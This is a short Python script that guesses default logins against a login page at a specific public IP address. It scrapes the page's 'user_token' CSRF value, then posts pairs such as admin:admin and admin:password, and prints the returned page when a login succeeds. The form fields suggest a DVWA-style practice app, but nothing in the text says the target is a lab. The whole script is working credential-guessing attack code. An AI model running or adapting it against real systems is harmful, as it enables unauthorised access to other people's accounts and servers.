
import requests
import re

# Create session
session = requests.Session()

# Get login page first to get token
login_page = session.get('http://31.97.117.123/login.php')
print("Login page status:", login_page.status_code)

# Extract token
token_match = re.search(r"user_token['\"]?\s*value['\"]?\s*=\s*['\"]([^'\"]+)['\"]", login_page.text)
if token_match:
    token = token_match.group(1)
    print(f"Found token: {token}")
else:
    print("No token found, trying without token")
    token = ""

# Try admin:admin
credentials = [
    ("admin", "admin"),
    ("user", "password"),
    ("admin", "password"),
    ("test", "test"),
]

for username, password in credentials:
    data = {
        'username': username,
        'password': password,
        'Login': 'Login',
        'user_token': token
    }
    
    response = session.post('http://31.97.117.123/login.php', data=data)
    print(f"\n--- Testing {username}:{password} ---")
    print(f"Status: {response.status_code}")
    
    if "incorrect" in response.text.lower():
        print("Result: Incorrect credentials")
    elif "Welcome" in response.text or "dashboard" in response.text.lower():
        print("Result: LOGIN SUCCESSFUL!")
        print("First 500 chars:", response.text[:500])
        break
    else:
        # Check if we got redirected or get a different page
        if len(response.text) > 100:
            print("Result: Got response, checking content...")
            print("First 500 chars:", response.text[:500])

